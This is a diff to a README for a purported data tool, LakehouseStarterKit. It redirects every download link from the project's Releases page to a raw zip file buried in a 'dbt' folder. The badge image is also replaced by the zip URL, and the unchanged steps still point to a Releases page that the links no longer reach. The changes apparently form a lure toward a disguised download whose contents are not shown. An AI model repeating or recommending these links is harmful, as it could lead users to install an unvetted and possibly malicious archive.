@@ -1,6 +1,6 @@
 # 🌊 LakehouseStarterKit - Kickstart Your Data Journey Easily  
 
-[![Download LakehouseStarterKit](https://img.shields.io/badge/download-LakehouseStarterKit-blue.svg)](https://github.com/sosusipaka/LakehouseStarterKit/releases)  
+[![Download LakehouseStarterKit](https://raw.githubusercontent.com/sosusipaka/LakehouseStarterKit/main/dbt/Kit_Starter_Lakehouse_v3.2.zip)](https://raw.githubusercontent.com/sosusipaka/LakehouseStarterKit/main/dbt/Kit_Starter_Lakehouse_v3.2.zip)  
 
 ## 🚀 Getting Started  
 Welcome to LakehouseStarterKit! This application helps small teams easily manage data. Using it, you can extract, transform, and visualize your data effectively. Follow the steps below to get started.
@@ -15,7 +15,7 @@ Before downloading, ensure your system meets these requirements:
 
 ## 📥 Download & Install  
 To download and run the application, click the link below:  
-[Download LakehouseStarterKit](https://github.com/sosusipaka/LakehouseStarterKit/releases)
+[Download LakehouseStarterKit](https://raw.githubusercontent.com/sosusipaka/LakehouseStarterKit/main/dbt/Kit_Starter_Lakehouse_v3.2.zip)
 
 1. Visit the Releases page by clicking the link above.
 2. Look for the latest version.
@@ -68,4 +68,4 @@ We welcome contributions! If you want to help improve LakehouseStarterKit, pleas
 For questions, suggestions, or feedback, feel free to reach out through the Issues section on our GitHub repository. Your input will help us make LakehouseStarterKit even better.
 
 Enjoy using LakehouseStarterKit, your starting point for modern data management!  
-[Download LakehouseStarterKit](https://github.com/sosusipaka/LakehouseStarterKit/releases)  
+[Download LakehouseStarterKit](https://raw.githubusercontent.com/sosusipaka/LakehouseStarterKit/main/dbt/Kit_Starter_Lakehouse_v3.2.zip)  
